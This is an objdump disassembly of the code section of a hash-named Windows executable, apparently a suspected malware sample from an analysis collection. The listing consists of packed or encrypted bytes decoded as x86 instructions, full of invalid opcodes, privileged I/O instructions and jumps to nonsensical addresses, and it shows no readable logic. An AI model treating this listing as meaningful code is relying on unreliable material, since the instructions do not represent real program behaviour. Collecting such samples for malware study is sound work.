
1a2e52f5b09ea512e15b3c226eed32ec827503176ac6d17e370248e627564bf4.exe:     file format pei-i386


Disassembly of section .text:

00411000 <.text>:
  411000:	rcr    BYTE PTR [esi+0x14],cl
  411003:	cmp    BYTE PTR [ebx-0x74],dl
  411006:	pushf  
  411007:	stos   DWORD PTR es:[edi],eax
  411008:	(bad)  
  411009:	(bad)  
  41100a:	imul   esp,DWORD PTR ds:0x4a265280,0x35cbee07
  411014:	icebp  
  411015:	in     al,0x94
  411017:	cmp    BYTE PTR [ebx+esi*4-0x31fb99db],bl
  41101e:	cmp    edi,DWORD PTR [ecx-0x2d]
  411021:	mov    ebp,0xac8a3835
  411026:	cmp    BYTE PTR [esp+eiz*4+0x54],ch
  41102a:	inc    ebx
  41102b:	mov    bl,BYTE PTR [edi]
  41102d:	mov    ah,0x8c
  41102f:	repnz popa 
  411031:	xchg   ebx,ebx
  411033:	je     0x411014
  411035:	pop    edi
  411036:	cmp    al,0x9d
  411038:	arpl   WORD PTR [ebp+0x5],bp
  41103b:	add    BYTE PTR [edi+0x4df62890],ch
  411041:	in     al,dx
  411042:	xor    esp,DWORD PTR [eax]
  411044:	pop    edx
  411045:	xchg   edx,eax
  411046:	icebp  
  411047:	sub    eax,0xf2181752
  41104c:	add    dl,BYTE PTR ds:0x94c9af0b
  411052:	fwait
  411053:	adc    al,0x4e
  411055:	dec    ecx
  411056:	adc    dl,0xa3
  411059:	sbb    DWORD PTR [edx+0x21],edi
  41105c:	pop    esp
  41105d:	ret    
  41105e:	push   cs
  41105f:	stos   DWORD PTR es:[edi],eax
  411060:	es daa 
  411062:	and    al,ah
  411064:	imul   BYTE PTR ds:0x55a89798
  41106a:	dec    esi
  41106b:	pop    es
  41106c:	std    
  41106d:	jnp    0x411047
  41106f:	cdq    
  411070:	ja     0x4110c6
  411072:	enter  0x709b,0x31
  411076:	add    BYTE PTR [ebp+0x48542043],bl
  41107c:	loop   0x4110bd
  41107e:	sbb    dl,dh
  411080:	cmp    DWORD PTR [esi+edi*8-0x6cd20e0f],eax
  411087:	push   edx
  411088:	outs   dx,DWORD PTR ds:[esi]
  411089:	call   FWORD PTR [edi-0x2e290548]
  41108f:	out    0x28,eax
  411091:	xor    BYTE PTR [esp+edi*8+0xb],bl
  411095:	mov    ecx,fs
  411097:	pop    ss
  411098:	inc    esp
  411099:	mov    dh,0xd6
  41109b:	cs test ah,dl
  41109e:	popf   
  41109f:	lahf   
  4110a0:	xor    BYTE PTR [eax+eax*4-0x3ca7fed0],cl
  4110a7:	(bad)  
  4110a8:	jecxz  0x411058
  4110aa:	cdq    
  4110ab:	sub    bl,BYTE PTR [esi]
  4110ad:	mov    cl,bh
  4110af:	in     al,dx
  4110b0:	ins    DWORD PTR es:[edi],dx
  4110b1:	jp     0x4110b5
  4110b3:	dec    edi
  4110b4:	mov    WORD PTR [ebx+0x43b07e0e],?
  4110ba:	mov    DWORD PTR [ebx-0x1b],eax
  4110bd:	add    eax,0x73daa466
  4110c2:	dec    esi
  4110c3:	inc    eax
  4110c4:	xchg   edi,eax
  4110c5:	cli    
  4110c6:	loopne 0x41109f
  4110c8:	out    0x8f,al
  4110ca:	pop    esi
  4110cb:	and    ah,BYTE PTR [edx+0x54]
  4110ce:	shl    DWORD PTR ds:0x3a3864eb,1
  4110d4:	adc    al,0x3c
  4110d6:	or     ch,dl
  4110d8:	inc    esi
  4110d9:	stos   DWORD PTR es:[edi],eax
  4110da:	fs and eax,0x84e4bd10
  4110e0:	xor    al,0xd4
  4110e2:	jne    0x411089
  4110e4:	jl     0x411111
  4110e6:	dec    edx
  4110e7:	shr    BYTE PTR [ebx+0x2c50277],0x54
  4110ee:	jbe    0x41108d
  4110f0:	loopne 0x411094
  4110f2:	fidivr DWORD PTR [ebp-0x2b]
  4110f5:	loope  0x41116d
  4110f7:	and    cl,BYTE PTR [ecx+0x272022bb]
  4110fd:	sti    
  4110fe:	fcomp  QWORD PTR [edi]
  411100:	push   DWORD PTR [ebx]
  411102:	inc    ebp
  411103:	outs   dx,BYTE PTR ds:[esi]
  411104:	in     al,dx
  411105:	sub    esp,DWORD PTR [edx-0x6735c52d]
  41110b:	or     dl,BYTE PTR gs:[edx-0x45]
  41110f:	and    cl,bl
  411111:	(bad)  
  411112:	(bad)  
  411113:	jb     0x411185
  411115:	fldl2e 
  411117:	adc    edi,DWORD PTR [esi+0x5fce3d4f]
  41111d:	push   ss
  41111e:	sbb    DWORD PTR [ecx-0x7e],0xffffff86
  411122:	cmp    ebp,DWORD PTR [ecx+0x19]
  411125:	jl     0x4110b1
  411127:	xchg   BYTE PTR [eax-0x2b],cl
  41112a:	or     dl,ah
  41112c:	sub    eax,0x29a88d9f
  411131:	jl     0x411177
  411133:	adc    eax,0xbeff89e1
  411138:	push   ebx
  411139:	fcomip st,st(0)
  41113b:	push   esi
  41113c:	xor    BYTE PTR [eax+0x570f7dba],0xaa
  411143:	dec    ebp
  411144:	lods   eax,DWORD PTR ds:[esi]
  411145:	jmp    0x924f3d8c
  41114a:	mov    ss,ebp
  41114c:	fistp  QWORD PTR [ebx]
  41114e:	ds sbb eax,0xe40c7263
  411154:	mov    ebx,0xa8caad
  411159:	xor    esp,ebx
  41115b:	shl    BYTE PTR [eax+0x29b74cd3],0xcc
  411162:	loopne 0x411172
  411164:	mov    esp,0x472137d7
  411169:	cdq    
  41116a:	mov    ?,WORD PTR [edi-0x597edfd9]
  411170:	int    0x6b
  411172:	xchg   edx,eax
  411173:	mov    BYTE PTR [ebp-0x75d2e837],dh
  411179:	mov    cs,WORD PTR [ecx-0x5ebbeeee]
  41117f:	sbb    eax,0x23802239
  411184:	out    dx,eax
  411185:	add    eax,0x1e602dd0
  41118a:	sub    DWORD PTR [edx-0x66],0x8428691c
  411191:	arpl   WORD PTR [ecx],ax
  411193:	lock cmp eax,ecx
  411196:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411197:	fwait
  411198:	in     al,dx
  411199:	xchg   ebx,eax
  41119a:	les    edx,FWORD PTR [edi+0x71914774]
  4111a0:	mov    esp,0x1b6b219e
  4111a5:	inc    ecx
  4111a6:	xchg   ecx,eax
  4111a7:	dec    esi
  4111a8:	imul   eax,DWORD PTR [esi],0xf5562aa5
  4111ae:	into   
  4111af:	ds stos DWORD PTR es:[edi],eax
  4111b1:	sub    bh,BYTE PTR [eax-0x5037f90a]
  4111b7:	ffree  st(6)
  4111b9:	out    0x30,eax
  4111bb:	mov    dl,0x16
  4111bd:	aam    0x6b
  4111bf:	push   edx
  4111c0:	xchg   edx,eax
  4111c1:	popa   
  4111c2:	cmc    
  4111c3:	cmp    bh,BYTE PTR [esi]
  4111c5:	test   bl,al
  4111c7:	mov    fs,WORD PTR [esi+0x6f16b359]
  4111cd:	adc    eax,0xa9bae1f1
  4111d2:	adc    eax,0x1762d58c
  4111d7:	nop
  4111d8:	dec    ebx
  4111d9:	data16 jno 0x411232
  4111dc:	pop    edx
  4111dd:	push   esp
  4111de:	xchg   ebp,eax
  4111df:	cmp    al,0x47
  4111e1:	and    ch,BYTE PTR [eax-0x64]
  4111e4:	fsub   QWORD PTR [edi+0x7e1e3820]
  4111ea:	mov    ch,0x5b
  4111ec:	pop    esi
  4111ed:	sbb    dh,BYTE PTR [si+0x3fdb]
  4111f2:	nop
  4111f3:	call   0x1c66793a
  4111f8:	xchg   edx,eax
  4111f9:	mov    cl,0xfe
  4111fb:	gs push edx
  4111fd:	retf   
  4111fe:	and    eax,0x6cf90c9b
  411203:	icebp  
  411204:	std    
  411205:	and    eax,0x310a461c
  41120a:	push   ds
  41120b:	pusha  
  41120c:	jae    0x4111a8
  41120e:	mov    al,ds:0x4e277af6
  411213:	jb     0x4111c8
  411215:	(bad)  
  411216:	lea    edi,[ecx-0x4f74213f]
  41121c:	add    DWORD PTR [edx],edx
  41121e:	stc    
  41121f:	lds    edi,FWORD PTR ds:0xe1f1c190
  411225:	cmp    BYTE PTR [ebx],al
  411227:	int    0x0
  411229:	or     eax,0xfed35a55
  41122e:	fwait
  41122f:	jp     0x4111e1
  411231:	jge    0x411291
  411233:	dec    eax
  411234:	fcomp  DWORD PTR [eax]
  411236:	dec    edx
  411237:	imul   ebp,esi,0xffffffa9
  41123a:	dec    ecx
  41123b:	add    BYTE PTR [ecx+0x3a4479eb],bh
  411241:	jecxz  0x41129d
  411243:	xchg   ebx,eax
  411244:	adc    cl,BYTE PTR [ebx+0xd5c2bdc]
  41124a:	neg    dl
  41124c:	icebp  
  41124d:	inc    eax
  41124e:	inc    esp
  41124f:	push   0x6ddc9900
  411254:	leave  
  411255:	mov    eax,0x5030c605
  41125a:	and    dh,bl
  41125c:	jmp    FWORD PTR [ecx-0x4420876d]
  411262:	and    bl,BYTE PTR [ebp+0xbc11e79]
  411268:	sbb    DWORD PTR [esi+0x5f],esi
  41126b:	(bad)  
  41126c:	mov    ecx,0xafc0b012
  411271:	hlt    
  411272:	shr    BYTE PTR [ebp+0xe],cl
  411275:	in     eax,dx
  411276:	aaa    
  411277:	xor    DWORD PTR [edx+0x211be1b9],esi
  41127d:	imul   edx,DWORD PTR [ebx+0x2f],0x96a076e7
  411284:	mov    esi,0x869a9179
  411289:	mov    edi,DWORD PTR [ecx+0x4a7cd77e]
  41128f:	add    esi,DWORD PTR [ebx+ecx*1]
  411292:	or     al,BYTE PTR [ebp-0x3a]
  411295:	and    al,0x1c
  411297:	call   0x25765580
  41129c:	add    eax,0x36adf581
  4112a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4112a2:	hlt    
  4112a3:	adc    DWORD PTR [eax],0xb41eaa08
  4112a9:	jp     0x4112e0
  4112ab:	jmp    0xf0c1:0x6bd10e08
  4112b2:	xor    al,0x71
  4112b4:	out    0xf3,al
  4112b6:	mov    ds:0xe6079cc8,eax
  4112bb:	pop    esi
  4112bc:	shr    BYTE PTR [edx],cl
  4112be:	shl    ebx,cl
  4112c0:	ds jnp 0x411295
  4112c3:	jg     0x41130f
  4112c5:	call   0xe469:0x4cf8aecb
  4112cc:	sub    al,0x8d
  4112ce:	mov    bh,0x21
  4112d0:	div    DWORD PTR [edi-0x556cd5a7]
  4112d6:	mov    al,0x79
  4112d8:	add    DWORD PTR [eax+eax*1],ebx
  4112db:	jmp    0x4112f7
  4112dd:	repz mov ebx,0x3961e21d
  4112e3:	cli    
  4112e4:	out    dx,eax
  4112e5:	(bad)  
  4112e6:	dec    esp
  4112e7:	adc    eax,0x417563d5
  4112ec:	stc    
  4112ed:	mov    al,ds:0x1313d86b
  4112f2:	(bad)  
  4112f3:	not    DWORD PTR [ecx-0x58]
  4112f6:	cmp    eax,0x1ddaed63
  4112fb:	imul   esp,DWORD PTR [ebx+0x51],0x19
  4112ff:	mov    esp,0x6bc5ce95
  411304:	(bad)  
  411305:	cwde   
  411306:	jle    0x41129b
  411308:	imul   DWORD PTR [edi+0x47c980fb]
  41130e:	sbb    cl,BYTE PTR [edx+0x3f]
  411311:	es pop esp
  411313:	imul   ebx,DWORD PTR [eax+eax*4-0x62434e08],0x2d
  41131b:	mov    bh,0x7e
  41131d:	inc    esi
  41131e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41131f:	cmc    
  411320:	retf   0xea09
  411323:	inc    ebp
  411324:	cmp    eax,0x78eed0b3
  411329:	in     eax,dx
  41132a:	dec    ebx
  41132b:	pop    ds
  41132c:	xor    BYTE PTR [ecx],0xfe
  41132f:	fidivr WORD PTR ds:0xd9714d19
  411335:	fild   WORD PTR [edx+0x45bd23b0]
  41133b:	mov    BYTE PTR [eax],0x87
  41133e:	icebp  
  41133f:	imul   ecx,DWORD PTR [edx+0x45],0xffffffd2
  411343:	dec    esi
  411344:	(bad)  [esi-0x2b7c3c8]
  41134a:	pop    edi
  41134b:	iret   
  41134c:	cmp    BYTE PTR [esi+eax*4],0x8b
  411350:	cwde   
  411351:	int3   
  411352:	push   es
  411353:	pop    esp
  411354:	ds mov esp,0x92fd2175
  41135a:	add    al,0x1c
  41135c:	xchg   ecx,eax
  41135d:	stc    
  41135e:	cmp    ch,BYTE PTR [edx-0x18]
  411361:	stos   DWORD PTR es:[edi],eax
  411362:	sbb    DWORD PTR [eax-0x73],edx
  411365:	add    dl,bh
  411367:	cmp    DWORD PTR [edx+ebx*8],edx
  41136a:	add    esp,DWORD PTR [esi+0x55c656b9]
  411370:	imul   esi,DWORD PTR [ecx+0x58e1f2ba],0x10
  411377:	pop    esp
  411378:	dec    esp
  411379:	dec    edx
  41137a:	fsubr  st(6),st
  41137c:	mov    edi,0x2a3c9f90
  411381:	loope  0x41131c
  411383:	mov    dh,BYTE PTR [ecx+0x56cba740]
  411389:	pop    ss
  41138a:	daa    
  41138b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41138c:	mov    BYTE PTR ds:0x623c0c58,dl
  411392:	mov    dl,0xa9
  411394:	dec    esp
  411395:	jle    0x411384
  411397:	loope  0x411406
  411399:	xchg   esp,eax
  41139a:	xchg   DWORD PTR cs:[ebx+0x426d3830],ecx
  4113a1:	mul    DWORD PTR [ecx+0x4d]
  4113a4:	das    
  4113a5:	(bad)  [eax-0x347e6b28]
  4113ab:	mov    ebx,0xa9157c75
  4113b0:	xchg   edx,eax
  4113b1:	fnstenv [edx-0x6ba7f744]
  4113b7:	sbb    DWORD PTR [edx],0xffffffe5
  4113ba:	pop    ss
  4113bb:	ins    DWORD PTR es:[edi],dx
  4113bc:	repnz cmp edi,DWORD PTR [ecx]
  4113bf:	mov    ch,0x5
  4113c1:	xchg   esi,eax
  4113c2:	pop    ecx
  4113c3:	pusha  
  4113c4:	and    DWORD PTR [edx+eax*8-0x198424ea],edi
  4113cb:	xchg   DWORD PTR [esi+0x7076764f],esi
  4113d1:	pop    ds
  4113d2:	ds push edi
  4113d4:	jb     0x4113b2
  4113d6:	push   0xc256554c
  4113db:	mov    DWORD PTR [edx+0x56682618],esi
  4113e1:	lods   al,BYTE PTR ds:[esi]
  4113e2:	sbb    bl,dl
  4113e4:	loopne 0x4113d9
  4113e6:	lods   eax,DWORD PTR ds:[esi]
  4113e7:	icebp  
  4113e8:	imul   ebx,DWORD PTR [edx-0xe892a8c],0xfac14d95
  4113f2:	aad    0x73
  4113f4:	fdiv   QWORD PTR [ebx+ecx*2-0xc02584f]
  4113fb:	(bad)  
  4113fc:	mov    ds:0xeffcc0a6,eax
  411401:	call   0xf13d:0xb8ae4276
  411408:	(bad)  
  411409:	ds inc ecx
  41140b:	cmp    DWORD PTR [eax],ebp
  41140d:	mov    bl,0x63
  41140f:	sti    
  411410:	call   FWORD PTR [ebx-0x7]
  411413:	stc    
  411414:	ins    BYTE PTR es:[edi],dx
  411415:	inc    edi
  411416:	lock cmp eax,0x528229e5
  41141c:	sar    DWORD PTR [edx+0x26528376],0xe7
  411423:	jl     0x41141d
  411425:	retf   
  411426:	pop    ss
  411427:	jecxz  0x411478
  411429:	das    
  41142a:	ret    0xabbe
  41142d:	int    0xe7
  41142f:	stos   DWORD PTR es:[edi],eax
  411430:	pop    si
  411432:	aad    0x85
  411434:	lahf   
  411435:	fwait
  411436:	jp     0x411433
  411438:	(bad)  
  411439:	mov    al,ds:0x5deabf38
  41143e:	push   0x5a27b130
  411443:	cmp    bl,BYTE PTR [eax-0x500b018c]
  411449:	repnz add al,0x68
  41144c:	cmp    esi,eax
  41144e:	adc    BYTE PTR [edi+0x36],bl
  411451:	pop    edi
  411452:	stos   BYTE PTR es:[edi],al
  411453:	shl    BYTE PTR [ecx],1
  411455:	pop    ebp
  411456:	push   ebx
  411457:	fcom   QWORD PTR [ebp-0x44b73bd4]
  41145d:	clc    
  41145e:	jae    0x4114d6
  411460:	xor    al,0x8c
  411462:	loop   0x411447
  411464:	bound  ecx,QWORD PTR [ebp+0x1b002cf1]
  41146a:	adc    ebx,DWORD PTR [eax-0x28]
  41146d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41146e:	out    0x56,al
  411470:	push   0x7eb3c9a3
  411475:	xchg   BYTE PTR ds:0x88261744,bh
  41147b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41147c:	push   es
  41147d:	retf   0x4141
  411480:	xor    BYTE PTR [esp+edx*8],dh
  411483:	xor    eax,0x9f845084
  411488:	cld    
  411489:	xchg   esp,eax
  41148a:	(bad)  
  41148b:	mov    esi,0x36fd1871
  411490:	push   ebx
  411491:	dec    esi
  411492:	sub    ch,0xf
  411495:	mov    ds:0x63f8b4f2,al
  41149a:	call   0xcf752c88
  41149f:	test   al,0xba
  4114a1:	fild   WORD PTR [ecx-0x6ef3d141]
  4114a7:	das    
  4114a8:	pop    ebp
  4114a9:	ss aad 0xd6
  4114ac:	add    BYTE PTR [edi-0x3f2adbd0],dh
  4114b2:	test   BYTE PTR [edx-0x2e8b3bce],ch
  4114b8:	mov    eax,0x511ea659
  4114bd:	(bad)  
  4114be:	mov    ecx,0xb3c4f22e
  4114c3:	clc    
  4114c4:	daa    
  4114c5:	cld    
  4114c6:	fbld   TBYTE PTR [ebx+0x6afda43d]
  4114cc:	lock popa 
  4114ce:	push   edi
  4114cf:	push   ecx
  4114d0:	xchg   DWORD PTR [eax],esi
  4114d2:	inc    edx
  4114d3:	xchg   BYTE PTR [ebx+0x39c41f11],ah
  4114d9:	mov    bl,0xe8
  4114db:	popf   
  4114dc:	sbb    al,0xa4
  4114de:	dec    ebx
  4114df:	push   edi
  4114e0:	(bad)  [esi-0x10]
  4114e3:	cmp    ebp,eax
  4114e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4114e6:	lods   al,BYTE PTR ds:[esi]
  4114e7:	push   cs
  4114e8:	mov    BYTE PTR [ebp+0x2299f342],bl
  4114ee:	fiadd  WORD PTR cs:[ebp-0x53935dd8]
  4114f5:	push   esp
  4114f6:	fstp   QWORD PTR [eax+esi*2]
  4114f9:	or     al,0xb4
  4114fb:	mov    bh,0xaf
  4114fd:	cld    
  4114fe:	(bad)  
  4114ff:	xchg   esi,eax
  411500:	lods   eax,DWORD PTR ds:[esi]
  411501:	xor    DWORD PTR [edx+ebx*1],0x7d
  411505:	mov    BYTE PTR [esi+0x70208cd9],bh
  41150b:	lahf   
  41150c:	repnz mov ecx,0x5b7ef833
  411512:	push   eax
  411513:	retf   0x4bf3
  411516:	mov    bl,0x89
  411518:	jp     0x411515
  41151a:	or     bh,BYTE PTR [ecx-0x37d528be]
  411520:	out    dx,al
  411521:	jbe    0x4114b1
  411523:	gs or  eax,0xe2cf502
  411529:	sbb    DWORD PTR [edi],0x68436dd5
  41152f:	cdq    
  411530:	iret   
  411531:	les    esi,FWORD PTR [ecx+ebx*2]
  411534:	add    eax,0x4a74dc86
  411539:	jle    0x411559
  41153b:	fs nop
  41153d:	add    DWORD PTR [ecx+0x24],ecx
  411540:	add    cl,BYTE PTR [edx-0x2c4553a3]
  411546:	push   edx
  411547:	sub    BYTE PTR [edx+0x71f7c3f4],dl
  41154d:	xchg   esi,eax
  41154e:	xchg   ebp,eax
  41154f:	and    eax,ebx
  411551:	inc    esp
  411552:	in     al,dx
  411553:	mov    bh,0x50
  411555:	mov    bh,0xb2
  411557:	aam    0x4d
  411559:	or     ecx,DWORD PTR [eax]
  41155b:	in     eax,0x51
  41155d:	push   edi
  41155e:	sbb    eax,DWORD PTR [edi]
  411560:	jns    0x411542
  411562:	js     0x411565
  411564:	scas   eax,DWORD PTR es:[edi]
  411565:	jns    0x41150a
  411567:	fld    TBYTE PTR [ebp-0x75d9593a]
  41156d:	and    eax,0x2a260e6
  411572:	popa   
  411573:	or     BYTE PTR [edi],bl
  411575:	(bad)  gs:[edi+0x1a]
  411579:	jp     0x4115ae
  41157b:	and    ax,WORD PTR [ecx]
  41157e:	xchg   ebx,eax
  41157f:	out    0x7c,eax
  411581:	outs   dx,DWORD PTR ds:[esi]
  411582:	pop    esp
  411583:	pop    ecx
  411584:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411585:	pop    ebp
  411586:	push   0x6f
  411588:	inc    ebp
  411589:	push   ecx
  41158a:	std    
  41158b:	inc    ecx
  41158c:	js     0x4115a3
  41158e:	ret    0xd1a3
  411591:	mov    edi,ebx
  411593:	mov    ebp,0x1bc179f6
  411598:	outs   dx,DWORD PTR ds:[esi]
  411599:	int3   
  41159a:	adc    al,0x52
  41159c:	sbb    esp,DWORD PTR ss:[edi+0x380411c3]
  4115a3:	test   al,0xa1
  4115a5:	aad    0x9f
  4115a7:	or     dl,BYTE PTR [ecx-0x552e05eb]
  4115ad:	mov    esi,0xb17f0827
  4115b2:	or     ebx,DWORD PTR [esi+eiz*2]
  4115b5:	push   ds
  4115b6:	test   DWORD PTR [ebx-0x441b6264],0x2f1c331c
  4115c0:	mov    edx,0xfc21b124
  4115c5:	cdq    
  4115c6:	stos   BYTE PTR es:[edi],al
  4115c7:	pop    edi
  4115c8:	or     edx,DWORD PTR ds:0x5203bdc7
  4115ce:	idiv   BYTE PTR [edx]
  4115d0:	fiadd  DWORD PTR [ecx+eiz*2-0x7329f5b]
  4115d7:	dec    edx
  4115d8:	adc    BYTE PTR [ecx+0x5d254938],0x81
  4115df:	pop    ss
  4115e0:	lods   eax,DWORD PTR ds:[esi]
  4115e1:	xchg   ecx,eax
  4115e2:	add    DWORD PTR [ecx],esi
  4115e4:	push   edx
  4115e5:	stos   DWORD PTR es:[edi],eax
  4115e6:	adc    esp,ebx
  4115e8:	xchg   DWORD PTR [edi],esi
  4115ea:	jp     0x411636
  4115ec:	in     eax,dx
  4115ed:	lods   al,BYTE PTR ds:[esi]
  4115ee:	gs jg  0x4115dc
  4115f1:	in     eax,dx
  4115f2:	mov    ecx,0x6b0053ea
  4115f7:	lahf   
  4115f8:	loopne 0x411585
  4115fa:	imul   eax,edi,0xfffffff2
  4115fd:	add    eax,0x1f06fc81
  411602:	push   ss
  411603:	dec    edx
  411604:	inc    BYTE PTR [edi-0x32]
  411607:	inc    ebx
  411608:	sar    DWORD PTR [ebx-0x36],0xcf
  41160c:	test   BYTE PTR [edx+edi*8],al
  41160f:	mov    ebp,0x4013d8f
  411614:	cld    
  411615:	xor    dl,BYTE PTR [ebx]
  411617:	stos   BYTE PTR es:[edi],al
  411618:	frstor [esi]
  41161a:	enter  0x81ff,0x34
  41161e:	add    al,0x7a
  411620:	in     al,dx
  411621:	mov    edx,0xae507f34
  411626:	cmc    
  411627:	pop    esi
  411628:	jmp    0x411614
  41162a:	ds stc 
  41162c:	aad    0xa0
  41162e:	push   0xe63bc198
  411633:	mov    dl,0xa3
  411635:	cwde   
  411636:	add    bh,bl
  411638:	in     al,0xf1
  41163a:	and    eax,0x5a8e96fb
  41163f:	xchg   edi,eax
  411640:	xchg   esi,eax
  411641:	adc    eax,0x70bb0257
  411646:	and    BYTE PTR ds:0xa649085a,0xdb
  41164d:	mov    BYTE PTR [edx-0x1],ch
  411650:	push   0x36afecbb
  411655:	mov    ecx,0xd8549c68
  41165a:	mov    dh,0xc2
  41165c:	jns    0x411604
  41165e:	jmp    0x4116b2
  411660:	jge    0x411606
  411662:	add    ebp,ebp
  411664:	xchg   ecx,eax
  411665:	loope  0x411635
  411667:	pop    edx
  411668:	loopne 0x41163b
  41166a:	jp     0x41165a
  41166c:	xlat   BYTE PTR ds:[ebx]
  41166d:	dec    esp
  41166e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41166f:	ret    0x561c
  411672:	dec    esi
  411673:	add    al,0x81
  411675:	inc    ebp
  411676:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411677:	or     dh,ch
  411679:	adc    ah,0x7
  41167c:	jmp    0x75d911ae
  411681:	ret    
  411682:	or     eax,0xd68ca161
  411687:	scas   eax,DWORD PTR es:[edi]
  411688:	mov    eax,ds:0x5ea1c909
  41168d:	sub    ebx,DWORD PTR [edx-0x61]
  411690:	aaa    
  411691:	adc    eax,0x15c4625b
  411696:	ja     0x411682
  411698:	fwait
  411699:	xor    eax,0x8724a46d
  41169e:	inc    ebx
  41169f:	or     dh,BYTE PTR [edx+0xbad02d5]
  4116a5:	cwde   
  4116a6:	xchg   ebx,eax
  4116a7:	jbe    0x411687
  4116a9:	mov    esi,eax
  4116ab:	pop    ss
  4116ac:	out    0x57,eax
  4116ae:	adc    BYTE PTR [eax-0x4515ec69],al
  4116b4:	jmp    0x4116a1
  4116b6:	dec    ebp
  4116b7:	cmp    DWORD PTR [ecx],0xece32fcb
  4116bd:	add    DWORD PTR [edi-0x4fc0c516],0x3bf8c4af
  4116c7:	jecxz  0x4116cf
  4116c9:	push   ecx
  4116ca:	(bad)  
  4116cb:	dec    ebx
  4116cc:	mov    eax,ds:0x34c38928
  4116d1:	add    eax,0xb1c07437
  4116d6:	mov    eax,0x89d458ae
  4116db:	sti    
  4116dc:	repnz push ecx
  4116de:	push   esp
  4116df:	stos   DWORD PTR es:[edi],eax
  4116e0:	or     eax,0x4f798730
  4116e5:	in     al,dx
  4116e6:	retf   
  4116e7:	cdq    
  4116e8:	sub    esi,DWORD PTR [ecx+eax*2-0xeaab74f]
  4116ef:	push   ebp
  4116f0:	mov    ebp,0xebbdcc5e
  4116f5:	addr16 xchg esi,eax
  4116f7:	dec    ecx
  4116f8:	rcl    ch,0x18
  4116fb:	xor    eax,0x6e412e0f
  411700:	test   al,0x9d
  411702:	jecxz  0x411706
  411704:	cmc    
  411705:	inc    ecx
  411706:	xor    cl,BYTE PTR [edx+0x2]
  411709:	or     BYTE PTR [eax-0x3293dda],0x58
  411710:	cmp    DWORD PTR [ecx-0x7e2cdb3c],eax
  411716:	dec    ebx
  411717:	push   ebx
  411718:	pop    eax
  411719:	neg    DWORD PTR [ecx+ebp*2]
  41171c:	stos   BYTE PTR es:[edi],al
  41171d:	shl    DWORD PTR [ecx+0x59a8002b],cl
  411723:	ja     0x411747
  411725:	icebp  
  411726:	mov    esi,0x90970467
  41172b:	push   cs
  41172c:	(bad)  [ebp+0x4d]
  41172f:	dec    edi
  411730:	pop    edx
  411731:	jmp    0x87a0:0x3df030aa
  411738:	pop    edx
  411739:	(bad)
  41173d:	ret    0xe577
  411740:	sti    
  411741:	in     eax,dx
  411742:	and    ebx,esi
  411744:	xor    eax,0xcf9cf79b
  411749:	pop    edx
  41174a:	fwait
  41174b:	sbb    eax,DWORD PTR [esi]
  41174d:	pop    ecx
  41174e:	inc    esp
  41174f:	shl    DWORD PTR [edx+ecx*4],1
  411752:	daa    
  411753:	aad    0xf5
  411755:	jae    0x4116dc
  411757:	sbb    BYTE PTR [esi],bh
  411759:	mov    BYTE PTR [ecx],bl
  41175b:	cmp    BYTE PTR [esi-0x11ec3336],dl
  411761:	cli    
  411762:	dec    ebp
  411763:	or     ch,bh
  411765:	retf   
  411766:	pop    eax
  411767:	into   
  411768:	leave  
  411769:	add    ecx,DWORD PTR [eax+0x58]
  41176c:	cmp    ch,BYTE PTR [edx+0x43]
  41176f:	sbb    dl,BYTE PTR [edi-0x23]
  411772:	ins    DWORD PTR es:[edi],dx
  411773:	push   0xffffffe0
  411775:	mov    ebx,0xd1fa3267
  41177a:	mov    esi,0x26c4a2c0
  41177f:	and    ebx,DWORD PTR [ecx-0x64189196]
  411785:	fsubr  QWORD PTR [ebp+0x6951a6dd]
  41178b:	(bad)  
  41178c:	fwait
  41178d:	daa    
  41178e:	or     DWORD PTR [eax+esi*8-0xd],edi
  411792:	icebp  
  411793:	cmovp  edx,DWORD PTR [edx-0x5d0258f1]
  41179a:	popf   
  41179b:	pop    esp
  41179c:	aad    0x3c
  41179e:	pop    ds
  41179f:	add    edx,DWORD PTR [ebx-0x6d]
  4117a2:	mov    al,BYTE PTR [ebx+0x7a]
  4117a5:	fisubr DWORD PTR [edx+0x1db97cc4]
  4117ab:	or     al,0x82
  4117ad:	ss jg  0x411821
  4117b0:	inc    edx
  4117b1:	mov    edi,0x23c94fe7
  4117b6:	out    0x99,eax
  4117b8:	imul   ebp,eax,0x54
  4117bb:	rcr    DWORD PTR [ebp+0x61],0x70
  4117bf:	arpl   WORD PTR [ebx-0x38],di
  4117c2:	mov    ebx,0x1f5ff17b
  4117c7:	or     bl,bh
  4117c9:	scas   eax,DWORD PTR es:[edi]
  4117ca:	loope  0x411765
  4117cc:	daa    
  4117cd:	aam    0xc7
  4117cf:	in     al,dx
  4117d0:	in     eax,dx
  4117d1:	hlt    
  4117d2:	ins    DWORD PTR es:[edi],dx
  4117d3:	dec    ecx
  4117d4:	xor    eax,DWORD PTR [edi+esi*8]
  4117d7:	loope  0x411770
  4117d9:	push   edi
  4117da:	jbe    0x411821
  4117dc:	lods   al,BYTE PTR ds:[esi]
  4117dd:	shl    DWORD PTR [esp+ebp*1],1
  4117e0:	sti    
  4117e1:	xchg   esi,eax
  4117e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4117e3:	cmc    
  4117e4:	sbb    BYTE PTR [eax+0x22c6236b],al
  4117ea:	inc    esi
  4117eb:	lock xor eax,0xd894f4f1
  4117f1:	dec    ebx
  4117f2:	mov    bl,0x80
  4117f4:	ror    BYTE PTR [ebx-0x4b],0xee
  4117f8:	and    eax,0xc296a44
  4117fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4117fe:	std    
  4117ff:	inc    esp
  411800:	stos   BYTE PTR es:[edi],al
  411801:	mov    ds:0xb6aed507,al
  411806:	leave  
  411807:	imul   ebx,DWORD PTR [eax-0xcb3ff04],0x60
  41180e:	leave  
  41180f:	rcl    DWORD PTR es:[edi],cl
  411812:	push   0x1c46a83c
  411817:	neg    BYTE PTR [edx-0x5c1710cf]
  41181d:	mov    ebp,0x843e08d
  411822:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411823:	nop
